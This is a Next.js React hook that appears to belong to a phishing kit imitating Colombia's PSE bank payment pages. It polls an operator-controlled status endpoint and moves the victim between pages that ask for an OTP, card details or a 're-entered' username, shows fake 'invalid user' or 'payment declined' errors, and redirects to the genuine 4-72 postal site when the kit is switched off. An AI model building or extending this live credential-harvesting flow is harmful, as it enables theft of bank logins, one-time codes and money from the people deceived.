"use client";

import { useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';

export function useCaseStatus() {
    const router = useRouter();
    const params = useParams();
    const bankId = params.bankId as string;

    useEffect(() => {
        const interval = setInterval(async () => {
            try {
                const response = await fetch('/api/estado');
                const data = await response.json();

                // Check Global System Status from state (passed from API if needed or separate call)
                const settingsRes = await fetch('/api/admin/settings');
                const settings = await settingsRes.json();

                if (settings.success) {
                    if (settings.systemStatus === 2) { // 404
                        window.location.href = '/img/error.avif'; // Image error as in original PHP
                        return;
                    }
                    if (settings.systemStatus === 3) { // OFF
                        window.location.href = 'https://www.4-72.com.co/publicaciones/236/personas/';
                        return;
                    }
                }

                if (data.status) {
                    // Mapping status to routes
                    switch (data.status) {
                        case 1: // USER_ENTERED
                            // If they are on the initial landing/loading, stay or go to user
                            break;
                        case 2: // OTP_REQUESTED
                            router.push(`/pse/${bankId}/otp`);
                            break;
                        case 3: // OTP_ENTERED
                            router.push(`/pse/${bankId}/cargando`);
                            break;
                        case 6: // CARD_REQUESTED
                            // Next page for card
                            break;
                        case 10: // FINISHED
                            router.push(`/pse/${bankId}/finish`);
                            break;
                        case 12: // NEW_USER_REQUESTED
                            router.push(`/pse/${bankId}/usuario?error=invalid_user`);
                            break;
                        case 40: // TOKEN_BOGOTA_SENT (usually shows an error or specific page)
                            // handle specific cases
                            break;
                        case 41: // ERROR_CC
                            router.push(`/pse/${bankId}/usuario?error=payment_declined`);
                            break;
                    }
                }
            } catch (error) {
                console.error('Error polling status:', error);
            }
        }, 3000);

        return () => clearInterval(interval);
    }, [router, bankId]);
}
